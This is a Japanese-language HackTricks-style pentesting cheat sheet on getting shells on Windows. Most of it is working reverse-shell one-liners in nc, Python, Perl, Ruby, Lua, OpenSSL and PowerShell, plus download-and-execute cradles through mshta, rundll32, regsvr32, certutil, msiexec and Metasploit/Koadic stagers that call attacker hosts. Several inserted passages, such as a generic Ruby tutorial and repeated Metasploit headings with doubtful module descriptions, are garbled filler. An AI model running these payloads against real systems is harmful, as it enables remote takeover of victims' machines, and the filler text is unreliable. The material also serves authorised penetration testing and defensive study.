# シェル - Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したい**ですか？または、HackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについてもっと学びましょう**

🐞 web3のバグチュートリアルを読む

🔔 新しいバグバウンティについて通知を受ける

💬 コミュニティディスカッションに参加する

## Lolbas

ページ[lolbas-project.github.io](https://lolbas-project.github.io/)は、[https://gtfobins.github.io/](https://gtfobins.github.io/)のように、Windows用です。\
明らかに、**WindowsにはSUIDファイルやsudo特権はありません**が、いくつかの**バイナリ**がどのように（悪用されて）任意のコードを実行するかを知るのは役に立ちます。

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**sbd**は、ポータブルで強力な暗号化を提供するために設計されたNetcatのクローンです。Unix系のオペレーティングシステムとMicrosoft Win32で動作します。sbdには、AES-CBC-128 + HMAC-SHA1暗号化（Christophe Devineによる）、プログラムの実行（-eオプション）、ソースポートの選択、遅延を伴う連続再接続など、他の便利な機能があります。sbdはTCP/IP通信のみをサポートしています。sbd.exe（Kali Linuxディストリビューションの一部：/usr/share/windows-resources/sbd/sbd.exe）は、Netcatの代替としてWindowsボックスにアップロードすることができます。

## Python
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
Perl is a high-level programming language that is commonly used for scripting and automation tasks. It is known for its powerful text processing capabilities and its ability to handle complex data structures. Perl is often used in the field of cybersecurity for tasks such as web scraping, data manipulation, and exploit development. It is particularly useful for writing scripts that interact with the Windows operating system, as it provides a wide range of built-in functions and modules for this purpose. Perl scripts can be executed on a Windows machine using the Perl interpreter, which is available for download from the official Perl website.
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## ルビー

Rubyは、オブジェクト指向のプログラミング言語であり、シンプルで読みやすい構文を持っています。Rubyは、Webアプリケーションの開発やスクリプトの作成に広く使用されています。

### Rubyのインストール

Rubyをインストールするには、公式のRubyインストーラを使用するか、パッケージマネージャを介してインストールします。

#### WindowsでのRubyのインストール

1. [RubyInstaller](https://rubyinstaller.org/)の公式ウェブサイトにアクセスします。
2. ダウンロードページから、最新のRubyInstallerをダウンロードします。
3. ダウンロードしたインストーラを実行し、指示に従ってインストールします。

#### LinuxでのRubyのインストール

1. ターミナルを開きます。
2. パッケージマネージャを使用してRubyをインストールします。例えば、Debianベースのディストリビューションでは、次のコマンドを実行します。

```bash
sudo apt-get install ruby
```

### Rubyの実行

Rubyスクリプトを実行するには、ターミナルで次のコマンドを使用します。

```bash
ruby script.rb
```

### Rubyの基本構文

以下は、Rubyの基本的な構文の例です。

#### 変数の宣言

```ruby
name = "John"
age = 25
```

#### 条件分岐

```ruby
if age >= 18
  puts "You are an adult."
else
  puts "You are a minor."
end
```

#### ループ

```ruby
for i in 1..5
  puts i
end
```

#### 関数の定義

```ruby
def greet(name)
  puts "Hello, #{name}!"
end

greet("John")
```

これらは、Rubyの基本的な構文の一部です。Rubyにはさまざまな機能がありますが、ここでは基本的な概念に焦点を当てています。

### Rubyの便利なライブラリ

Rubyには、さまざまな便利なライブラリがあります。以下は、いくつかの一般的なライブラリの例です。

- `net/http`：HTTPリクエストを送信するためのライブラリ。
- `json`：JSONデータのパースと生成を行うためのライブラリ。
- `csv`：CSVファイルの読み書きを行うためのライブラリ。

これらのライブラリは、Rubyの機能を拡張し、開発プロセスを簡素化するのに役立ちます。

### Rubyのセキュリティ

Rubyは、セキュリティに関する機能やツールを提供しています。以下は、いくつかのセキュリティ関連のトピックの例です。

- サニタイズ：ユーザー入力を安全に処理するための方法。
- エスケープ：特殊文字をエスケープするための方法。
- 暗号化：データを暗号化するための方法。

これらのトピックは、Rubyのセキュリティに関する基本的な概念をカバーしています。

### Rubyのデバッグ

Rubyには、デバッグに役立つツールやテクニックがあります。以下は、いくつかのデバッグ関連のトピックの例です。

- `puts`メソッド：変数の値を表示するための方法。
- `binding.pry`：プログラムの実行を一時停止し、変数の値を調べるための方法。
- `raise`キーワード：エラーを発生させるための方法。

これらのトピックは、Rubyのデバッグに関する基本的な概念をカバーしています。

### Rubyの拡張

Rubyは、拡張性が高く、カスタムの機能やライブラリを作成することができます。以下は、いくつかの拡張関連のトピックの例です。

- モジュール：再利用可能なコードのブロックを作成するための方法。
- クラスの継承：既存のクラスを拡張するための方法。
- ライブラリの作成：独自のライブラリを作成するための方法。

これらのトピックは、Rubyの拡張に関する基本的な概念をカバーしています。

Rubyは、柔軟性と読みやすさを兼ね備えた強力なプログラミング言語です。これらの基本的な概念を理解し、便利なライブラリやセキュリティ機能を活用することで、効率的な開発とセキュアなコーディングが可能になります。
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Luaは、軽量で高速なスクリプト言語であり、組み込みシステムやゲーム開発などのさまざまな用途に使用されています。Luaスクリプトは、Windowsシェルで実行することもできます。

### Luaスクリプトの実行

WindowsシェルでLuaスクリプトを実行するには、次の手順を実行します。

1. Luaの実行可能ファイル（`lua.exe`）をダウンロードしてインストールします。

2. コマンドプロンプトを開き、Luaスクリプトが保存されているディレクトリに移動します。

3. 次のコマンドを使用して、Luaスクリプトを実行します。

   ```
   lua script.lua
   ```

   ここで、`script.lua`は実行したいLuaスクリプトのファイル名です。

### Luaスクリプトのデバッグ

Luaスクリプトのデバッグには、デバッガツールを使用することができます。デバッガツールを使用すると、スクリプトの実行中に変数の値を確認したり、ステップ実行したりすることができます。

一般的なLuaデバッガツールには、[ZeroBrane Studio](https://studio.zerobrane.com/)や[Decoda](http://unknownworlds.com/decoda/)などがあります。これらのツールを使用すると、Luaスクリプトのデバッグが容易になります。

### Luaスクリプトのセキュリティ上の考慮事項

Luaスクリプトの実行には、セキュリティ上のリスクが伴う場合があります。悪意のあるスクリプトは、システムに損害を与える可能性があります。

以下のセキュリティ上の考慮事項に留意して、Luaスクリプトを実行してください。

- 信頼できるソースからのみスクリプトを実行する。
- スクリプトがシステムリソースにアクセスしないようにする。
- スクリプトが予期しない動作をしないようにする。

これらのセキュリティ上の考慮事項に留意することで、Luaスクリプトの実行を安全に行うことができます。
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

攻撃者（Kali）
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
被害者
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

Powershellは、Windowsシステムで使用される強力なスクリプト言語およびシェル環境です。Powershellは、Windowsの管理、自動化、およびタスクの実行に広く使用されています。以下に、Powershellを使用した一般的な攻撃手法とその対策を示します。

### Powershellの攻撃手法

1. **Powershellスクリプトの実行**: 攻撃者は、悪意のあるPowershellスクリプトを作成し、ターゲットシステムで実行することで、システムに侵入します。対策としては、信頼できるソースからのみPowershellスクリプトを実行するように設定することが重要です。

2. **Powershellリモートコード実行**: 攻撃者は、リモートでPowershellスクリプトを実行することで、ターゲットシステムに侵入します。対策としては、不要なPowershellリモートコード実行機能を無効にすることが重要です。

3. **Powershellのバイパス**: 攻撃者は、Powershellのセキュリティ制限を回避するために、バイパス技術を使用します。対策としては、Powershellの実行ポリシーを厳格に設定し、不要なバイパスを無効にすることが重要です。

4. **Powershellの権限昇格**: 攻撃者は、Powershellを使用してシステムの権限を昇格させることで、システムに深く侵入します。対策としては、最小特権の原則に基づいて、Powershellの実行権限を制限することが重要です。

### Powershellの対策

1. **Powershellの実行ポリシーの設定**: Powershellの実行ポリシーを制限することで、不正なスクリプトの実行を防ぐことができます。適切な実行ポリシーを設定し、信頼できるソースからのみスクリプトを実行するようにします。

2. **Powershellリモートコード実行の無効化**: 不要なPowershellリモートコード実行機能を無効にすることで、リモートからの攻撃を防ぐことができます。必要な場合にのみリモートコード実行を有効にし、信頼できる接続のみを許可します。

3. **Powershellのバイパスの無効化**: 不要なPowershellバイパスを無効にすることで、攻撃者のバイパス技術を防ぐことができます。必要なバイパスのみを有効にし、セキュリティ制限を厳密に設定します。

4. **最小特権の原則の適用**: Powershellの実行権限を最小限に制限することで、攻撃者の権限昇格を防ぐことができます。必要な権限のみを与え、不要な権限を削除します。

以上が、Powershellの一般的な攻撃手法と対策です。これらの対策を実施することで、Powershellを使用した攻撃からシステムを保護することができます。
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
ネットワーク呼び出しを実行しているプロセス: **powershell.exe**\
ディスク上に書き込まれたペイロード: **NO** (_少なくとも私がprocmonを使用して見つけることはありませんでした！_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
ネットワーク呼び出しを実行するプロセス: **svchost.exe**\
ディスク上に書き込まれたペイロード: **WebDAVクライアントのローカルキャッシュ**

**ワンライナー:**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Mshta is a Windows utility that allows you to execute HTML applications (HTAs) using the Microsoft HTML Application Host. It can be used as a shell to execute commands and scripts on a Windows system.

### Basic Usage

To use Mshta as a shell, you can create an HTA file with the desired commands or scripts and then execute it using the following command:

```
mshta <hta_file>
```

For example, if you have an HTA file called `payload.hta`, you can execute it using the following command:

```
mshta payload.hta
```

### Payload Delivery

Mshta can be used to deliver payloads to a target system. You can create an HTA file that contains malicious code or a script that downloads and executes a payload from a remote server.

### Bypassing Application Whitelisting

Mshta can be used to bypass application whitelisting on Windows systems. Since it is a legitimate Windows utility, it is often allowed by default in application whitelisting policies.

### Persistence

Mshta can be used to achieve persistence on a compromised system. You can create an HTA file that runs at startup or as a scheduled task to maintain access to the system.

### Detection and Evasion

Mshta can be detected by monitoring for its execution or by analyzing the HTA files it uses. To evade detection, you can obfuscate the HTA file or use techniques such as steganography to hide the malicious code.

### References

- [Mshta - Windows Command Line](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mshta)
- [Mshta - Attack Surface Analyzer](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction)
- [Mshta - MITRE ATT&CK](https://attack.mitre.org/techniques/T1218/011/)
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
ネットワーク呼び出しを実行するプロセス: **mshta.exe**\
ディスク上に書き込まれたペイロード: **IEローカルキャッシュ**
```bash
mshta http://webserver/payload.hta
```
ネットワーク呼び出しを実行するプロセス: **mshta.exe**\
ディスク上に書き込まれたペイロード: **IEローカルキャッシュ**
```bash
mshta \\webdavserver\folder\payload.hta
```
ネットワークコールを実行するプロセス: **svchost.exe**\
ディスク上に書き込まれたペイロード: **WebDAVクライアントのローカルキャッシュ**

#### **hta-pshリバースシェルの例（htaを使用してPSバックドアをダウンロードして実行する）**
```markup
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Koadicゾンビを非常に簡単にダウンロードして実行することができます。ステージャーhtaを使用した例**

#### htaの例

```html
<iframe src="http://attacker.com/evil.hta"></iframe>
```

この例では、攻撃者のサーバーにある`evil.hta`ファイルを含む`iframe`要素が使用されています。この`hta`ファイルは、Koadicゾンビをダウンロードして実行するためのステージャーとして機能します。
```markup
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

**mshta** is a Windows utility that allows executing HTML applications (.hta files) without the need of a browser. This can be useful for executing malicious code on a target system.

To use **mshta** with a **.sct** file, follow these steps:

1. Create a **.sct** file with the desired script code. This file should contain VBScript or JScript code.
2. Host the **.sct** file on a web server or transfer it to the target system.
3. Use **mshta** to execute the **.sct** file by running the following command:

```
mshta http://<server>/<path>/file.sct
```

Replace `<server>` with the IP address or domain name of the server hosting the **.sct** file, and `<path>` with the path to the file on the server.

By executing the **.sct** file with **mshta**, the script code will be executed on the target system, allowing for various actions such as downloading and executing additional payloads, creating files, modifying the registry, or executing commands.

It's important to note that **mshta** may trigger security alerts, as it is a known tool used by attackers. Therefore, it's crucial to use it responsibly and only in controlled environments, such as during penetration testing or authorized security assessments.
```markup
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

#### **Mshta - Metasploit**

Mshta is a Microsoft HTML Application Host that allows you to execute HTML applications (.hta files) on Windows systems. It is a legitimate Windows component, but it can also be used by attackers to execute malicious code.

Metasploit, a popular penetration testing framework, provides a module called `exploit/windows/browser/mshta` that allows you to exploit the Mshta vulnerability.

To use this module, you need to set the `SRVHOST`, `SRVPORT`, and `URIPATH` options. The `SRVHOST` and `SRVPORT` options specify the IP address and port number of the Metasploit server, while the `URIPATH` option specifies the path of the malicious .hta file.

Once the options are set, you can run the exploit by executing the `exploit` command. This will start the Metasploit server and serve the malicious .hta file to the target system. When the target system opens the .hta file, the payload will be executed.

It is important to note that the target system must have Internet Explorer installed for this exploit to work. Additionally, the target system's security settings may affect the success of the exploit.

#### **Mshta - Metasploit**

Mshtaは、Windowsシステム上でHTMLアプリケーション（.htaファイル）を実行するためのMicrosoft HTML Application Hostです。これは正当なWindowsコンポーネントですが、攻撃者は悪意のあるコードを実行するためにも使用することができます。

人気のあるペネトレーションテストフレームワークであるMetasploitは、Mshtaの脆弱性を悪用するための`exploit/windows/browser/mshta`というモジュールを提供しています。

このモジュールを使用するには、`SRVHOST`、`SRVPORT`、および`URIPATH`オプションを設定する必要があります。`SRVHOST`と`SRVPORT`オプションは、MetasploitサーバーのIPアドレスとポート番号を指定し、`URIPATH`オプションは悪意のある.htaファイルのパスを指定します。

オプションが設定されたら、`exploit`コマンドを実行してエクスプロイトを実行できます。これにより、Metasploitサーバーが起動し、悪意のある.htaファイルがターゲットシステムに提供されます。ターゲットシステムが.htaファイルを開くと、ペイロードが実行されます。

このエクスプロイトが機能するには、ターゲットシステムにはInternet Explorerがインストールされている必要があります。さらに、ターゲットシステムのセキュリティ設定がエクスプロイトの成功に影響する可能性があります。
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Defenderによって検出されました**

## **Rundll32**

[**Dllハローワールドの例**](https://github.com/carterjones/hello-world-dll)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
ネットワーク呼び出しを実行するプロセス: **svchost.exe**\
ディスク上に書き込まれたペイロード: **WebDAVクライアントのローカルキャッシュ**
```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
ネットワーク呼び出しを実行しているプロセス：**rundll32.exe**\
ディスク上に書き込まれたペイロード：**IEローカルキャッシュ**

**Defenderによって検出されました**

**Rundll32 - sct**
```bash
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

#### **Rundll32 - Metasploit**

Rundll32 is a Windows utility that allows the execution of DLL files as if they were executable files. This can be leveraged by an attacker to execute malicious code on a target system.

Metasploit, a popular penetration testing framework, provides a module called "windows/local/execute" that can be used to execute arbitrary commands on a target system using rundll32.

To use this module, you need to set the following options:

- `SESSION`: The session number of the target system.
- `CMD`: The command to be executed.

Once the options are set, you can run the module using the `exploit` command.

Here is an example of how to use the "windows/local/execute" module in Metasploit to execute a command using rundll32:

```
use windows/local/execute
set SESSION <session_number>
set CMD <command_to_execute>
exploit
```

After running the module, the specified command will be executed on the target system using rundll32.

It is important to note that the target system must have the necessary DLL file for the command to be executed. Additionally, the user running rundll32 must have the appropriate permissions to execute the command.

This technique can be useful for post-exploitation activities, such as executing additional commands or downloading and executing files on the target system.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files as functions. This can be leveraged by attackers to load malicious DLLs and execute their code. One popular tool that utilizes Rundll32 for post-exploitation is Koadic.

Koadic is a post-exploitation RAT (Remote Access Tool) that provides a command-and-control interface to interact with compromised systems. It uses Rundll32 to load its DLL payload and establish a backdoor on the target machine.

To use Koadic, the attacker first needs to generate a malicious DLL payload using the Koadic framework. This payload is then loaded using Rundll32, which executes the code contained within the DLL. Once the payload is executed, the attacker gains remote access to the compromised system and can perform various actions, such as executing commands, capturing screenshots, and exfiltrating data.

Koadic provides a range of features that make it a powerful tool for post-exploitation activities. It supports multiple communication channels, including HTTP, HTTPS, and DNS, allowing the attacker to bypass network restrictions. It also has built-in modules for privilege escalation, lateral movement, and persistence, enabling the attacker to escalate privileges, move laterally within the network, and maintain access to the compromised system.

It is important for defenders to be aware of the use of Rundll32 and tools like Koadic in post-exploitation scenarios. Monitoring for suspicious DLL loading activity and implementing strong security measures can help mitigate the risk of such attacks.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

Regsvr32は、Windowsシステムで使用されるコマンドラインツールです。主にDLLファイルを登録および登録解除するために使用されます。このツールは、Windowsのレジストリにエントリを追加することで、DLLファイルをシステムに統合します。

### 使用法

Regsvr32を使用するには、次のコマンドを実行します。

```bash
regsvr32 <DLLファイルのパス>
```

### 登録

DLLファイルを登録するには、次のコマンドを実行します。

```bash
regsvr32 <DLLファイルのパス>
```

### 登録解除

DLLファイルの登録を解除するには、次のコマンドを実行します。

```bash
regsvr32 /u <DLLファイルのパス>
```

### 注意事項

- Regsvr32を実行する際は、管理者権限が必要です。
- 正しいパスを指定することが重要です。誤ったDLLファイルを登録すると、システムに問題が発生する可能性があります。
- Regsvr32は、悪意のあるコードを実行するためにも使用されることがあります。不正なDLLファイルを登録することによるセキュリティリスクに注意してください。

詳細な情報については、[公式ドキュメント](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32)を参照してください。
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
ネットワーク呼び出しを実行するプロセス: **regsvr32.exe**\
ディスク上に書き込まれたペイロード: **IEのローカルキャッシュ**
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
ネットワーク呼び出しを実行しているプロセス：**svchost.exe**\
ディスク上に書き込まれたペイロード：**WebDAVクライアントのローカルキャッシュ**

**Defenderによって検出されました**

#### Regsvr32 -sct
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

#### **Regsvr32 - Metasploit**

Regsvr32 is a Windows command-line utility used to register and unregister DLLs (Dynamic Link Libraries) and ActiveX controls in the Windows Registry. This utility can also be used to execute arbitrary code on a target system.

Metasploit, a popular penetration testing framework, provides a module called `regsvr32_command_delivery` that leverages the regsvr32 utility to execute malicious code on a target system.

To use this module, follow these steps:

1. Start Metasploit by running the `msfconsole` command.
2. Search for the `regsvr32_command_delivery` module using the `search` command.
3. Load the module using the `use` command followed by the module name.
4. Set the required options, such as the `RHOSTS` (target IP address) and `CMD` (command to execute).
5. Run the module using the `exploit` command.

Once the module is executed successfully, the specified command will be executed on the target system.

It is important to note that the regsvr32 utility may trigger antivirus alerts, so additional evasion techniques may be necessary to bypass detection.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**非常に簡単にKoadicゾンビをダウンロードして実行できます。ステージャーregsvrを使用します**

## Certutil

B64dllをダウンロードし、デコードして実行します。
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
B64exeをダウンロードし、デコードして実行します。
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Defenderによって検出されました**

***

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについて詳しく学びましょう**

🐞 web3のバグチュートリアルを読む

🔔 新しいバグ報奨金について通知を受ける

💬 コミュニティのディスカッションに参加する

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Cscript is a command-line scripting engine provided by Microsoft. It is commonly used to execute VBScript or JScript scripts on Windows systems. Metasploit, on the other hand, is a popular penetration testing framework that includes various tools and exploits for testing the security of computer systems.

In the context of Metasploit, Cscript can be used as a payload to deliver malicious scripts to a target system. This can be done by creating a malicious script using Metasploit's scripting capabilities and then using Cscript to execute it on the target.

To use Cscript as a payload in Metasploit, you can follow these steps:

1. Generate a malicious script using Metasploit's scripting capabilities. This can be done using the `msfvenom` command, which allows you to generate various types of payloads.

2. Set the payload to use Cscript. This can be done by specifying the `windows/cscript` payload in Metasploit.

3. Configure the necessary options for the payload, such as the target IP address and port.

4. Exploit the target system by running the exploit command.

Once the exploit is successful, the malicious script will be executed on the target system using Cscript. This can allow you to perform various actions on the target, such as gaining remote access or executing commands.

It is important to note that using Cscript as a payload can be detected by antivirus software, as it involves executing scripts on the target system. Therefore, it is recommended to use evasion techniques or modify the payload to bypass antivirus detection.

For more information on using Cscript as a payload in Metasploit, you can refer to the Metasploit documentation or online resources.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Defenderによって検出されました**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
ネットワーク呼び出しを実行するプロセス: **svchost.exe**\
ディスク上に書き込まれたペイロード: **WebDAVクライアントのローカルキャッシュ**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**防御者によって検出されました**

## **MSIExec**

攻撃者
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
被害者：
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
